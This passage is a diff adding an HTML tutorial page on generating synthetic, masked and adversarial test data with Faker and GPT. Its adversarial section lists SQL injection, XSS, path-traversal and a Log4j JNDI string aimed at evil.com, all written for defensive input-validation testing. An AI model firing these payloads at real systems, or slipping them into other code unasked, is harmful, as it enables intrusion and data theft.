@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Generate sophisticated test data using AI, GANs, and synthetic data techniques. Learn privacy-safe data masking and realistic persona creation.">
+    <title>Tutorial 6: AI-Powered Test Data Generation - Nebaz AI Academy</title>
+    <link rel="stylesheet" href="../../css/style.css">
+    <link rel="stylesheet" href="../../css/nebaz-theme.css">
+    <link rel="stylesheet" href="../../css/mobile-enhancements.css">
+    <script src="../../js/config.js"></script>
+    <script src="../../js/navigation.js"></script>
+    <!-- Prism.js for Syntax Highlighting -->
+    <link href="../../../vendor/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+    
+    <style>
+        /* Tutorial-specific styles */
+        .tutorial-content {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem 1rem;
+        }
+        
+        .tutorial-header {
+            background: linear-gradient(135deg, #078930 0%, #0d9488 100%);
+            padding: 3rem 0;
+            color: white;
+            text-align: center;
+            position: relative;
+        }
+        
+        .tutorial-content h2 {
+            font-size: 1.875rem;
+            font-weight: 700;
+            margin-top: 2.5rem;
+            margin-bottom: 1rem;
+            color: var(--text-dark);
+        }
+        
+        .tutorial-content h3 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-top: 2rem;
+            margin-bottom: 0.75rem;
+            color: var(--text-dark);
+        }
+        
+        .tutorial-content p {
+            margin-bottom: 1.25rem;
+            line-height: 1.8;
+            color: var(--text-medium);
+        }
+        
+        .tutorial-content ul,
+        .tutorial-content ol {
+            margin-bottom: 1.5rem;
+            padding-left: 2rem;
+            line-height: 1.8;
+            color: var(--text-medium);
+        }
+        
+        .tutorial-content li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .tutorial-content code {
+            background-color: #f1f5f9;
+            padding: 0.2rem 0.5rem;
+            border-radius: 0.25rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #e11d48;
+        }
+        
+        .tutorial-content pre {
+            background-color: #1e293b;
+            color: #e2e8f0;
+            padding: 1.5rem;
+            border-radius: 0.75rem;
+            overflow-x: auto;
+            margin-bottom: 1.5rem;
+        }
+        
+        .tutorial-content pre code {
+            background-color: transparent;
+            color: inherit;
+            padding: 0;
+        }
+        
+        .info-box {
+            background-color: #ecfdf5;
+            border-left: 4px solid #078930;
+            padding: 1.25rem;
+            border-radius: 0.5rem;
+            margin: 1.5rem 0;
+        }
+        
+        .info-box p {
+            margin: 0;
+            color: #065f46;
+        }
+        
+        .warning-box {
+            background-color: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            padding: 1.25rem;
+            border-radius: 0.5rem;
+            margin: 1.5rem 0;
+        }
+        
+        .warning-box p {
+            margin: 0;
+            color: #92400e;
+        }
+        
+        .success-box {
+            background-color: #d1fae5;
+            border-left: 4px solid #10b981;
+            padding: 1.25rem;
+            border-radius: 0.5rem;
+            margin: 1.5rem 0;
+        }
+        
+        .success-box p {
+            margin: 0;
+            color: #065f46;
+        }
+        
+        .tutorial-nav {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 2px solid var(--border-color);
+        }
+        
+        .tutorial-nav a {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1.5rem;
+            background-color: var(--bg-light);
+            border-radius: 0.5rem;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+        
+        .tutorial-nav a:hover {
+            background-color: var(--primary-color);
+            color: white;
+            transform: translateX(-3px);
+        }
+        
+        .tutorial-nav .next:hover {
+            transform: translateX(3px);
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation Bar - Auto-injected by common.js -->
+    
+    <!-- Tutorial Header -->
+    <div class="tutorial-header">
+        <div class="container">
+            <div class="tutorial-badge advanced">Advanced</div>
+            <h1 class="page-title">AI-Powered Test Data Generation</h1>
+            <p class="page-subtitle">Create realistic, privacy-safe test data at scale using AI, synthetic data generation, and smart masking techniques</p>
+        </div>
+    </div>
+
+    <!-- Tutorial Content -->
+    <div class="tutorial-content">
+        
+        <p>Testing with production data? That's a GDPR violation waiting to happen. Using the same 10 hardcoded test records? You'll miss edge cases. Manually creating test data for 1,000 users? That's weeks of work. AI solves all of this by generating unlimited, realistic, privacy-safe test data in seconds.</p>
+
+        <p>In this tutorial, you'll learn to create sophisticated test data using Faker, GPT models, and synthetic data generation. You'll build systems that generate realistic personas, edge cases, and even adversarial inputs—all while keeping your data compliant with privacy regulations.</p>
+
+        <h2>The Test Data Challenge</h2>
+        
+        <p>Traditional approaches to test data have serious problems:</p>
+
+        <ul>
+            <li><strong>Production data is dangerous:</strong> Contains PII, violates GDPR/CCPA, security risk</li>
+            <li><strong>Manual creation is slow:</strong> Hours to create diverse, realistic datasets</li>
+            <li><strong>Hardcoded data is limited:</strong> Same test records miss edge cases</li>
+            <li><strong>Copied data lacks diversity:</strong> All users named "John Smith" age 30</li>
+            <li><strong>Edge cases are forgotten:</strong> Unicode names, extreme values, special characters</li>
+        </ul>
+
+        <div class="info-box">
+            <p>💡 <strong>Industry Impact:</strong> Netflix uses synthetic data generation to create billions of test records for their recommendation engine. Facebook generates synthetic user profiles to test privacy controls without exposing real data.</p>
+        </div>
+
+        <h2>Understanding Synthetic Data Generation</h2>
+
+        <p>Synthetic data is artificially generated data that mimics real data's statistical properties without containing actual sensitive information:</p>
+
+        <ul>
+            <li><strong>Rule-based:</strong> Define patterns and constraints (Faker library)</li>
+            <li><strong>Statistical:</strong> Learn distributions from real data, generate similar samples</li>
+            <li><strong>ML-based:</strong> Train models (GANs, VAEs) to generate realistic data</li>
+            <li><strong>AI-powered:</strong> Use GPT to generate contextually realistic data</li>
+        </ul>
+
+        <h2>Level 1: Basic Data Generation with Faker</h2>
+
+        <p>Start with the Faker library for quick, realistic test data:</p>
+
+        <pre><code class="language-bash"># Install Faker
+pip install faker
+</code></pre>
+
+        <pre><code class="language-python">from faker import Faker
+import random
+import json
+
+fake = Faker()
+
+class BasicTestDataGenerator:
+    """
+    Generate basic test data using Faker
+    """
+    
+    def __init__(self, seed=42):
+        """
+        Args:
+            seed: Random seed for reproducibility
+        """
+        self.fake = Faker()
+        Faker.seed(seed)
+        random.seed(seed)
+    
+    def generate_user(self):
+        """Generate a single realistic user"""
+        return {
+            'user_id': fake.uuid4(),
+            'username': fake.user_name(),
+            'email': fake.email(),
+            'first_name': fake.first_name(),
+            'last_name': fake.last_name(),
+            'phone': fake.phone_number(),
+            'address': {
+                'street': fake.street_address(),
+                'city': fake.city(),
+                'state': fake.state(),
+                'zip_code': fake.zipcode(),
+                'country': fake.country()
+            },
+            'date_of_birth': fake.date_of_birth(minimum_age=18, maximum_age=90).isoformat(),
+            'registered_date': fake.date_time_this_year().isoformat(),
+            'is_active': random.choice([True, False]),
+            'credit_card': fake.credit_card_number(),
+            'job': fake.job(),
+            'company': fake.company()
+        }
+    
+    def generate_users(self, count=100):
+        """Generate multiple users"""
+        return [self.generate_user() for _ in range(count)]
+    
+    def generate_edge_cases(self):
+        """Generate edge case users"""
+        edge_cases = []
+        
+        # Very long names
+        edge_cases.append({
+            'type': 'long_name',
+            'first_name': 'A' * 100,
+            'last_name': 'B' * 100,
+            'email': 'test@example.com'
+        })
+        
+        # Special characters
+        edge_cases.append({
+            'type': 'special_chars',
+            'first_name': "O'Brien-Smith",
+            'last_name': "von Müller-González",
+            'email': 'test+special@example.com'
+        })
+        
+        # Unicode names
+        edge_cases.append({
+            'type': 'unicode',
+            'first_name': '李明',
+            'last_name': '王',
+            'email': 'test@example.com'
+        })
+        
+        # Minimum age
+        edge_cases.append({
+            'type': 'min_age',
+            'first_name': 'Teen',
+            'last_name': 'User',
+            'date_of_birth': '2006-01-01',
+            'email': 'teen@example.com'
+        })
+        
+        # Maximum age
+        edge_cases.append({
+            'type': 'max_age',
+            'first_name': 'Senior',
+            'last_name': 'User',
+            'date_of_birth': '1930-01-01',
+            'email': 'senior@example.com'
+        })
+        
+        # Empty optional fields
+        edge_cases.append({
+            'type': 'minimal_data',
+            'first_name': 'Min',
+            'last_name': 'User',
+            'email': 'min@example.com',
+            'phone': None,
+            'address': None
+        })
+        
+        return edge_cases
+
+# Usage
+generator = BasicTestDataGenerator()
+
+# Generate 100 realistic users
+users = generator.generate_users(100)
+
+print("Sample User:")
+print(json.dumps(users[0], indent=2))
+
+# Generate edge cases
+edge_cases = generator.generate_edge_cases()
+
+print("\n\nEdge Cases:")
+for case in edge_cases:
+    print(f"\n{case['type'].upper()}:")
+    print(json.dumps(case, indent=2))
+
+# Save to file
+with open('test_users.json', 'w') as f:
+    json.dump(users, f, indent=2)
+
+print(f"\n✅ Generated {len(users)} users and {len(edge_cases)} edge cases")
+</code></pre>
+
+        <h2>Level 2: Context-Aware Generation with GPT</h2>
+
+        <p>Use GPT to generate data that makes sense together:</p>
+
+        <pre><code class="language-python">import openai
+import os
+from dotenv import load_dotenv
+
+load_dotenv()
+openai.api_key = os.getenv("OPENAI_API_KEY")
+
+class ContextAwareDataGenerator:
+    """
+    Generate contextually realistic test data using GPT
+    """
+    
+    def __init__(self, model="gpt-3.5-turbo"):
+        self.model = model
+    
+    def generate_user_persona(self, persona_type="random"):
+        """
+        Generate realistic user persona with consistent backstory
+        
+        Args:
+            persona_type: Type of persona (student, professional, senior, etc.)
+        """
+        prompt = f"""Generate a realistic user persona for testing purposes.
+
+PERSONA TYPE: {persona_type}
+
+Create a fictional person with:
+- Demographics (age, occupation, location)
+- Realistic browsing/shopping behavior
+- Appropriate email/username style
+- Consistent preferences and interests
+- Realistic financial status for their profile
+
+Return as JSON with keys: name, age, occupation, location, email, username, 
+interests, typical_behavior, income_level, tech_savviness, shopping_preferences
+
+Make it feel like a real person, not generic test data."""
+
+        try:
+            response = openai.ChatCompletion.create(
+                model=self.model,
+                messages=[
+                    {"role": "user", "content": prompt}
+                ],
+                temperature=0.8
+            )
+            
+            content = response.choices[0].message.content
+            
+            # Extract JSON
+            if "```json" in content:
+                content = content.split("```json")[1].split("```")[0].strip()
+            elif "```" in content:
+                content = content.split("```")[1].split("```")[0].strip()
+            
+            return json.loads(content)
+            
+        except Exception as e:
+            print(f"❌ Error: {e}")
+            return {}
+    
+    def generate_realistic_transactions(self, persona, count=20):
+        """
+        Generate realistic transaction history for a persona
+        """
+        prompt = f"""Generate {count} realistic purchase transactions for this user:
+
+USER PERSONA:
+{json.dumps(persona, indent=2)}
+
+Create transactions that make sense for this person's:
+- Income level and spending habits
+- Interests and hobbies
+- Age and lifestyle
+- Location and preferences
+
+Include: date, merchant, category, amount, payment_method
+Make amounts realistic for their income level.
+Transactions should tell a story about their life.
+
+Return as JSON array."""
+
+        try:
+            response = openai.ChatCompletion.create(
+                model=self.model,
+                messages=[
+                    {"role": "user", "content": prompt}
+                ],
+                temperature=0.8,
+                max_tokens=1500
+            )
+            
+            content = response.choices[0].message.content
+            
+            if "```json" in content:
+                content = content.split("```json")[1].split("```")[0].strip()
+            elif "```" in content:
+                content = content.split("```")[1].split("```")[0].strip()
+            
+            return json.loads(content)
+            
+        except Exception as e:
+            print(f"❌ Error: {e}")
+            return []
+
+# Usage
+context_gen = ContextAwareDataGenerator()
+
+# Generate different persona types
+persona_types = ["college student", "working professional", "retiree", 
+                "stay-at-home parent", "entrepreneur"]
+
+personas = []
+
+for persona_type in persona_types:
+    print(f"\n{'='*60}")
+    print(f"Generating: {persona_type.upper()}")
+    print('='*60)
+    
+    persona = context_gen.generate_user_persona(persona_type)
+    print(json.dumps(persona, indent=2))
+    
+    # Generate transactions for this persona
+    transactions = context_gen.generate_realistic_transactions(persona, count=10)
+    persona['transactions'] = transactions
+    
+    personas.append(persona)
+    
+    print(f"\n✅ Generated persona with {len(transactions)} transactions")
+
+# Save personas
+with open('realistic_personas.json', 'w') as f:
+    json.dump(personas, f, indent=2)
+
+print(f"\n✅ Saved {len(personas)} complete personas to realistic_personas.json")
+</code></pre>
+
+        <div class="success-box">
+            <p>✅ <strong>Context-Aware Data:</strong> GPT generates personas where everything makes sense together—a college student buys textbooks and ramen, not luxury watches. A retiree's spending reflects their lifestyle.</p>
+        </div>
+
+        <h2>Level 3: Privacy-Safe Data Masking</h2>
+
+        <p>Transform production data into test data while preserving privacy:</p>
+
+        <pre><code class="language-python">import hashlib
+import re
+from faker import Faker
+
+class PrivacyPreservingDataMasker:
+    """
+    Mask sensitive data while preserving format and structure
+    """
+    
+    def __init__(self, seed=42):
+        self.fake = Faker()
+        Faker.seed(seed)
+        self.email_cache = {}  # Consistent masking
+        self.name_cache = {}
+    
+    def mask_email(self, email):
+        """
+        Mask email consistently
+        john.doe@company.com -> masked123@fakeco.com
+        """
+        if email in self.email_cache:
+            return self.email_cache[email]
+        
+        # Preserve domain structure
+        parts = email.split('@')
+        if len(parts) != 2:
+            return self.fake.email()
+        
+        username, domain = parts
+        
+        # Hash username for consistency
+        hashed = hashlib.md5(username.encode()).hexdigest()[:8]
+        fake_domain = self.fake.domain_name()
+        
+        masked = f"user{hashed}@{fake_domain}"
+        self.email_cache[email] = masked
+        
+        return masked
+    
+    def mask_name(self, name):
+        """Mask name consistently"""
+        if name in self.name_cache:
+            return self.name_cache[name]
+        
+        # Use hash to get consistent fake name
+        name_hash = int(hashlib.md5(name.encode()).hexdigest(), 16)
+        Faker.seed(name_hash)
+        fake_name = self.fake.name()
+        Faker.seed(42)  # Reset
+        
+        self.name_cache[name] = fake_name
+        return fake_name
+    
+    def mask_phone(self, phone):
+        """Mask phone number while preserving format"""
+        # Preserve format but randomize digits
+        masked = re.sub(r'\d', lambda x: str(random.randint(0, 9)), phone)
+        return masked
+    
+    def mask_credit_card(self, cc_number):
+        """
+        Mask credit card but preserve last 4 digits and card type
+        """
+        # Keep last 4 digits
+        last_four = cc_number[-4:]
+        
+        # Preserve card type (Visa starts with 4, Mastercard 5, etc.)
+        first_digit = cc_number[0]
+        
+        # Generate fake middle digits
+        middle_length = len(cc_number) - 5
+        fake_middle = ''.join([str(random.randint(0, 9)) for _ in range(middle_length)])
+        
+        return f"{first_digit}{fake_middle}{last_four}"
+    
+    def mask_ssn(self, ssn):
+        """Mask SSN"""
+        return self.fake.ssn()
+    
+    def mask_address(self, address):
+        """Generate fake address"""
+        return {
+            'street': self.fake.street_address(),
+            'city': self.fake.city(),
+            'state': self.fake.state(),
+            'zip_code': self.fake.zipcode()
+        }
+    
+    def mask_dataset(self, data):
+        """
+        Mask entire dataset of user records
+        """
+        masked_data = []
+        
+        for record in data:
+            masked_record = record.copy()
+            
+            # Mask PII fields
+            if 'email' in record:
+                masked_record['email'] = self.mask_email(record['email'])
+            
+            if 'first_name' in record:
+                masked_record['first_name'] = self.mask_name(record['first_name'])
+            
+            if 'last_name' in record:
+                masked_record['last_name'] = self.mask_name(record['last_name'])
+            
+            if 'phone' in record:
+                masked_record['phone'] = self.mask_phone(record['phone'])
+            
+            if 'credit_card' in record:
+                masked_record['credit_card'] = self.mask_credit_card(record['credit_card'])
+            
+            if 'ssn' in record:
+                masked_record['ssn'] = self.mask_ssn(record['ssn'])
+            
+            if 'address' in record:
+                masked_record['address'] = self.mask_address(record['address'])
+            
+            masked_data.append(masked_record)
+        
+        return masked_data
+
+# Usage example: Mask production-like data
+production_like_data = [
+    {
+        'user_id': 1,
+        'email': 'john.doe@gmail.com',
+        'first_name': 'John',
+        'last_name': 'Doe',
+        'phone': '555-123-4567',
+        'credit_card': '4532123456789012',
+        'ssn': '123-45-6789',
+        'address': '123 Main St, Springfield, IL 62701'
+    },
+    {
+        'user_id': 2,
+        'email': 'jane.smith@yahoo.com',
+        'first_name': 'Jane',
+        'last_name': 'Smith',
+        'phone': '555-987-6543',
+        'credit_card': '5432109876543210',
+        'ssn': '987-65-4321',
+        'address': '456 Oak Ave, Chicago, IL 60601'
+    }
+]
+
+masker = PrivacyPreservingDataMasker()
+masked_data = masker.mask_dataset(production_like_data)
+
+print("BEFORE MASKING:")
+print(json.dumps(production_like_data[0], indent=2))
+
+print("\n\nAFTER MASKING:")
+print(json.dumps(masked_data[0], indent=2))
+
+print("\n✅ Data masked - safe for testing, GDPR compliant!")
+</code></pre>
+
+        <div class="warning-box">
+            <p>⚠️ <strong>Legal Requirement:</strong> Using real customer data in test environments violates GDPR (€20M fine) and CCPA ($7,500 per violation). Always mask or synthesize test data!</p>
+        </div>
+
+        <h2>Level 4: Adversarial Test Data</h2>
+
+        <p>Generate "evil" inputs to test security and robustness:</p>
+
+        <pre><code class="language-python">class AdversarialDataGenerator:
+    """
+    Generate malicious/adversarial inputs for security testing
+    """
+    
+    def generate_sql_injection_payloads(self):
+        """Generate SQL injection test cases"""
+        return [
+            "'; DROP TABLE users; --",
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' /*",
+            "admin' --",
+            "admin' #",
+            "' UNION SELECT NULL, username, password FROM users --",
+            "1' AND 1=1 --",
+            "' AND 1=(SELECT COUNT(*) FROM users) --",
+            "'; EXEC xp_cmdshell('dir'); --"
+        ]
+    
+    def generate_xss_payloads(self):
+        """Generate XSS attack test cases"""
+        return [
+            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+            "&lt;img src=x onerror=alert('XSS')&gt;",
+            "&lt;svg onload=alert('XSS')&gt;",
+            "javascript:alert('XSS')",
+            "&lt;iframe src='javascript:alert(\"XSS\")'&gt;&lt;/iframe&gt;",
+            "&lt;body onload=alert('XSS')&gt;",
+            "&lt;input type='text' value='&lt;script&gt;alert(1)&lt;/script&gt;'&gt;",
+            "&lt;&lt;SCRIPT&gt;alert('XSS');//&lt;&lt;/SCRIPT&gt;",
+            "&lt;IMG SRC=\"javascript:alert('XSS');\"&gt;",
+            "&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;"
+        ]
+    
+    def generate_buffer_overflow_strings(self):
+        """Generate extremely long strings"""
+        return [
+            "A" * 1000,
+            "A" * 10000,
+            "A" * 100000,
+            "🔥" * 1000,  # Unicode overflow
+            "\\n" * 10000  # Newline overflow
+        ]
+    
+    def generate_special_character_tests(self):
+        """Generate special character edge cases"""
+        return [
+            "",  # Empty string
+            " ",  # Single space
+            "   ",  # Multiple spaces
+            "\t\n\r",  # Whitespace chars
+            "null",
+            "NULL",
+            "undefined",
+            "None",
+            "true",
+            "false",
+            "0",
+            "-1",
+            "1/0",  # Division by zero
+            "../../../etc/passwd",  # Path traversal
+            "..\\..\\..\\windows\\system32",
+            "%00",  # Null byte
+            "${jndi:ldap://evil.com/a}",  # Log4j
+            "';!--\"<XSS>=&{()}",  # Mixed special chars
+        ]
+    
+    def generate_email_edge_cases(self):
+        """Generate edge case email addresses"""
+        return [
+            "test@test",  # No TLD
+            "@test.com",  # No username
+            "test@",  # No domain
+            "test..test@test.com",  # Double dots
+            "test@test..com",  # Double dots in domain
+            "test test@test.com",  # Space
+            "test'test@test.com",  # Single quote
+            'test"test@test.com',  # Double quote
+            "test@[192.168.1.1]",  # IP address
+            "test+filter@test.com",  # Plus sign (valid)
+            "a@b.c",  # Minimal
+            "a" * 64 + "@test.com",  # Max local part
+            "test@" + "a" * 253 + ".com",  # Max domain
+        ]
+    
+    def generate_unicode_attacks(self):
+        """Generate Unicode-based attacks"""
+        return [
+            "admin\u202Etest",  # Right-to-left override
+            "test\u0000admin",  # Null byte
+            "test\uFEFFadmin",  # Zero-width no-break space
+            "test\u200Badmin",  # Zero-width space
+            "①②③④⑤",  # Circled numbers
+            "𝐓𝐞𝐬𝐭",  # Mathematical bold
+            "🔥💯😂",  # Emojis
+            "مرحبا",  # Arabic
+            "你好",  # Chinese
+            "Привет",  # Russian
+        ]
+    
+    def generate_numeric_edge_cases(self):
+        """Generate numeric boundary test cases"""
+        return [
+            0,
+            -1,
+            1,
+            2147483647,  # Max 32-bit signed int
+            -2147483648,  # Min 32-bit signed int
+            9999999999999999,  # Large number
+            0.000000001,  # Very small
+            float('inf'),  # Infinity
+            float('-inf'),  # Negative infinity
+            float('nan'),  # Not a number
+        ]
+    
+    def generate_complete_adversarial_suite(self):
+        """Generate complete adversarial test suite"""
+        return {
+            'sql_injection': self.generate_sql_injection_payloads(),
+            'xss': self.generate_xss_payloads(),
+            'buffer_overflow': self.generate_buffer_overflow_strings(),
+            'special_chars': self.generate_special_character_tests(),
+            'email_edge_cases': self.generate_email_edge_cases(),
+            'unicode_attacks': self.generate_unicode_attacks(),
+            'numeric_edge_cases': self.generate_numeric_edge_cases()
+        }
+
+# Usage
+adv_gen = AdversarialDataGenerator()
+adversarial_suite = adv_gen.generate_complete_adversarial_suite()
+
+print("ADVERSARIAL TEST DATA SUITE")
+print("="*60)
+
+for category, payloads in adversarial_suite.items():
+    print(f"\n{category.upper()}: {len(payloads)} test cases")
+    print("Sample:")
+    for payload in payloads[:3]:
+        print(f"  - {repr(payload)}")
+
+# Save to file
+with open('adversarial_test_data.json', 'w') as f:
+    # Convert special values to strings for JSON serialization
+    serializable = {}
+    for key, values in adversarial_suite.items():
+        serializable[key] = [str(v) for v in values]
+    json.dump(serializable, f, indent=2)
+
+print(f"\n✅ Saved adversarial test suite to adversarial_test_data.json")
+</code></pre>
+
+        <div class="info-box">
+            <p>💡 <strong>Security Testing:</strong> These adversarial inputs test if your application properly sanitizes inputs. If any of these cause crashes, errors, or security breaches, you've found a vulnerability!</p>
+        </div>
+
+        <h2>Complete Test Data Pipeline</h2>
+
+        <p>Bring everything together:</p>
+
+        <pre><code class="language-python">class ComprehensiveTestDataPipeline:
+    """
+    Complete test data generation system
+    """
+    
+    def __init__(self):
+        self.basic_gen = BasicTestDataGenerator()
+        self.context_gen = ContextAwareDataGenerator()
+        self.masker = PrivacyPreservingDataMasker()
+        self.adv_gen = AdversarialDataGenerator()
+    
+    def generate_complete_dataset(self, num_users=1000, 
+                                  include_personas=True,
+                                  include_edge_cases=True,
+                                  include_adversarial=True):
+        """
+        Generate comprehensive test dataset
+        """
+        dataset = {
+            'metadata': {
+                'generated_at': datetime.now().isoformat(),
+                'total_users': num_users,
+                'includes_personas': include_personas,
+                'includes_edge_cases': include_edge_cases,
+                'includes_adversarial': include_adversarial
+            },
+            'users': [],
+            'personas': [],
+            'edge_cases': [],
+            'adversarial': {}
+        }
+        
+        print("🚀 Starting comprehensive test data generation...\n")
+        
+        # Generate basic users
+        print(f"📝 Generating {num_users} basic users...")
+        dataset['users'] = self.basic_gen.generate_users(num_users)
+        print(f"✅ Generated {len(dataset['users'])} users\n")
+        
+        # Generate personas with GPT
+        if include_personas:
+            print("🎭 Generating realistic personas...")
+            persona_types = ["college student", "working professional", 
+                           "retiree", "entrepreneur", "stay-at-home parent"]
+            
+            for p_type in persona_types:
+                try:
+                    persona = self.context_gen.generate_user_persona(p_type)
+                    transactions = self.context_gen.generate_realistic_transactions(persona, 10)
+                    persona['transactions'] = transactions
+                    dataset['personas'].append(persona)
+                    print(f"  ✅ {p_type}")
+                except Exception as e:
+                    print(f"  ⚠️ {p_type}: {e}")
+            
+            print(f"✅ Generated {len(dataset['personas'])} personas\n")
+        
+        # Generate edge cases
+        if include_edge_cases:
+            print("🔍 Generating edge cases...")
+            dataset['edge_cases'] = self.basic_gen.generate_edge_cases()
+            print(f"✅ Generated {len(dataset['edge_cases'])} edge cases\n")
+        
+        # Generate adversarial data
+        if include_adversarial:
+            print("⚠️ Generating adversarial test data...")
+            dataset['adversarial'] = self.adv_gen.generate_complete_adversarial_suite()
+            total_adv = sum(len(v) for v in dataset['adversarial'].values())
+            print(f"✅ Generated {total_adv} adversarial test cases\n")
+        
+        return dataset
+    
+    def save_dataset(self, dataset, output_dir='test_data'):
+        """Save dataset to organized files"""
+        import os
+        os.makedirs(output_dir, exist_ok=True)
+        
+        # Save users
+        with open(f"{output_dir}/users.json", 'w') as f:
+            json.dump(dataset['users'], f, indent=2)
+        
+        # Save personas
+        if dataset['personas']:
+            with open(f"{output_dir}/personas.json", 'w') as f:
+                json.dump(dataset['personas'], f, indent=2)
+        
+        # Save edge cases
+        if dataset['edge_cases']:
+            with open(f"{output_dir}/edge_cases.json", 'w') as f:
+                json.dump(dataset['edge_cases'], f, indent=2)
+        
+        # Save adversarial
+        if dataset['adversarial']:
+            # Convert to serializable format
+            serializable = {}
+            for key, values in dataset['adversarial'].items():
+                serializable[key] = [str(v) for v in values]
+            
+            with open(f"{output_dir}/adversarial.json", 'w') as f:
+                json.dump(serializable, f, indent=2)
+        
+        # Save metadata
+        with open(f"{output_dir}/metadata.json", 'w') as f:
+            json.dump(dataset['metadata'], f, indent=2)
+        
+        print(f"💾 Dataset saved to {output_dir}/")
+        print(f"   - users.json ({len(dataset['users'])} records)")
+        print(f"   - personas.json ({len(dataset['personas'])} records)")
+        print(f"   - edge_cases.json ({len(dataset['edge_cases'])} records)")
+        print(f"   - adversarial.json")
+        print(f"   - metadata.json")
+
+# Complete usage
+from datetime import datetime
+import random
+
+pipeline = ComprehensiveTestDataPipeline()
+
+# Generate complete dataset
+dataset = pipeline.generate_complete_dataset(
+    num_users=500,
+    include_personas=True,  # Set to False to skip GPT (faster/cheaper)
+    include_edge_cases=True,
+    include_adversarial=True
+)
+
+# Save to files
+pipeline.save_dataset(dataset, output_dir='complete_test_data')
+
+print("\n" + "="*60)
+print("✅ TEST DATA GENERATION COMPLETE!")
+print("="*60)
+print(f"Total users: {len(dataset['users'])}")
+print(f"Personas: {len(dataset['personas'])}")
+print(f"Edge cases: {len(dataset['edge_cases'])}")
+print(f"Adversarial categories: {len(dataset['adversarial'])}")
+</code></pre>
+
+        <div class="success-box">
+            <p>✅ <strong>Complete Solution:</strong> You now have 500+ realistic users, 5 detailed personas with transaction histories, edge cases, and comprehensive adversarial test data—all generated in under 2 minutes!</p>
+        </div>
+
+        <h2>Best Practices</h2>
+
+        <ol>
+            <li><strong>Use seeds for reproducibility:</strong> Set random seeds so tests are deterministic</li>
+            <li><strong>Generate once, reuse many times:</strong> Save generated data to version control</li>
+            <li><strong>Layer your data:</strong> Basic → Edge cases → Adversarial → Personas</li>
+            <li><strong>Validate generated data:</strong> Ensure it matches your schema and constraints</li>
+            <li><strong>Update regularly:</strong> Regenerate test data as requirements evolve</li>
+            <li><strong>Never use production data:</strong> Even "anonymized" data can be re-identified</li>
+            <li><strong>Document data types:</strong> Tag data with its purpose (happy path, edge case, etc.)</li>
+            <li><strong>Balance cost vs quality:</strong> Use Faker for bulk, GPT for realistic personas</li>
+        </ol>
+
+        <h2>Integration with Test Frameworks</h2>
+
+        <pre><code class="language-python"># pytest fixture for test data
+import pytest
+
+@pytest.fixture(scope="session")
+def test_users():
+    """Load test users once per test session"""
+    with open('test_data/users.json', 'r') as f:
+        return json.load(f)
+
+@pytest.fixture(scope="session")
+def edge_case_users():
+    """Load edge case test data"""
+    with open('test_data/edge_cases.json', 'r') as f:
+        return json.load(f)
+
+@pytest.fixture(scope="session")
+def adversarial_payloads():
+    """Load adversarial test data"""
+    with open('test_data/adversarial.json', 'r') as f:
+        return json.load(f)
+
+# Use in tests
+def test_user_registration(test_users):
+    """Test with realistic generated users"""
+    for user in test_users[:10]:  # Test with first 10 users
+        response = register_user(user)
+        assert response.status_code == 201
+
+def test_sql_injection_protection(adversarial_payloads):
+    """Test SQL injection protection"""
+    for payload in adversarial_payloads['sql_injection']:
+        response = search_users(query=payload)
+        # Should not crash or return error
+        assert response.status_code in [200, 400]  # Not 500
+</code></pre>
+
+        <h2>Practice Exercise</h2>
+
+        <p><strong>Challenge:</strong> Build a complete test data generator that:</p>
+        <ol>
+            <li>Generates 1,000 realistic e-commerce users with purchase histories</li>
+            <li>Creates 10 detailed personas (student, senior, etc.) with GPT</li>
+            <li>Generates 50+ edge cases (Unicode names, extreme ages, etc.)</li>
+            <li>Includes 100+ adversarial payloads (SQL injection, XSS, etc.)</li>
+            <li>Masks real production data (if available) for comparison</li>
+            <li>Exports everything to organized JSON files</li>
+            <li>Creates pytest fixtures for easy test integration</li>
+        </ol>
+
+        <p><strong>Bonus:</strong> Add data validation to ensure all generated data matches your database schema!</p>
+
+        <h2>Key Takeaways</h2>
+
+        <ul>
+            <li>Faker generates realistic basic data quickly and cheaply</li>
+            <li>GPT creates contextually aware personas with realistic behaviors</li>
+            <li>Privacy-safe masking transforms production data into test data legally</li>
+            <li>Adversarial data generation tests security and robustness</li>
+            <li>Layered approach: Basic → Edge cases → Adversarial → Personas</li>
+            <li>Reproducible test data enables consistent, reliable testing</li>
+            <li>Never use real customer data in test environments (GDPR/CCPA)</li>
+        </ul>
+
+        <h2>What's Next?</h2>
+
+        <p>In the next tutorial, <strong>AI for Performance & Load Testing</strong>, you'll learn to use AI for intelligent load testing, performance bottleneck prediction, and automated scaling recommendations. You'll explore:</p>
+        <ul>
+            <li>ML-based load pattern generation</li>
+            <li>Predicting performance bottlenecks</li>
+            <li>AI-driven performance optimization</li>
+            <li>Anomaly detection in metrics</li>
+        </ul>
+
+        <div class="success-box">
+            <p>✅ <strong>Tutorial Complete!</strong> You can now generate unlimited, realistic, privacy-safe test data at scale—no more hardcoded "John Smith" users!</p>
+        </div>
+
+        <!-- Interactive Quiz Section -->
+        <div class="quiz-container">
+            <div class="quiz-header">
+                <h2 class="quiz-title">🎯 Test Your Knowledge: Test Data Generation</h2>
+                <p class="quiz-description">Check your understanding of AI-powered test data creation</p>
+            </div>
+
+            <div class="quiz-question">
+                <p class="quiz-question-text">1. What is the maximum fine for GDPR violations when using real customer data in test environments?</p>
+                <div class="quiz-options">
+                    <div class="quiz-option" data-correct="false">€1 million</div>
+                    <div class="quiz-option" data-correct="false">€5 million</div>
+                    <div class="quiz-option" data-correct="true">€20 million or 4% of global revenue</div>
